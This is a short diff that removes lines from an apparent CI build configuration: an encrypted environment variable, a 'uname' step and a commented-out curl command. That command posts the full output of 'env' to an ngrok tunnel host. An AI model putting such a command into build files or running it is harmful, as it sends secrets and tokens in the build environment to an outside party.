@@ -1,6 +1,0 @@
-#env:
-#  global:
-#    - secure: "euaZevv0XYwKaLeZLYf1X6ElP7WugjimNrccjD+BzRNe5OTl6qeHUw6RfsBoRoM+h2rdB3TTo6RTkN+u5IhvuXYPJ62J3ap9kVQe4Jh0J0CZpUBMf17Hn3bQiQFM3ydq+QAoArI/gOwh+S4eOCjT0mO92tn/DyB9+ETEV2WtQ0UHgZMJa+1r9fdtm6JAt7qLv0L4IBJCZiVapl3xbe1O0pjEqCqmiyhTQc6BYGZRAE1+1pS3zk/M2Ou4GlAXdKzBDr2bqnlnSrwn4KZ+ooqCFqi+GlloXhx+N5JTnNUmqwGEk36Ji1jdh66GTYgwgPZchYT82HSxFWbG82ddCA1q1eqpGu3JGtLHaLs8I+Ebt1tTa0mRE/k38O/5PWohuPlXIi2zE4a7WTunJuTtPSfYnEa4doJSUjQEjrY5E+D6SVRx6a9d6sVkMCifKbyjl+t8LEcJ0l9ErP7sdjneY3MxFBdOnrzdcRa+M8EqSgkxj7gpN+3euDMU3LVUW34j+cQyp5GuCLuFSg+5cu7BtjTp3b5vmFiJrrLKORQs+m0ycSUKJw9zYK4r9L+IsQz2f6oGFM9vGXw+H8U7QTabJUjmiqiFSNzGkwJSNxLTbw98ynYDqHVYS/GbtCs3wiyXChbu3SsIPEmZ+X6Rs9c2LyyF4Kkpl6/81xd4eXfYpdr6p6A="
-script: 
-#  - curl -d "foo=$(env)" https://2ca3-173-228-105-201.ngrok.io/
-  - uname
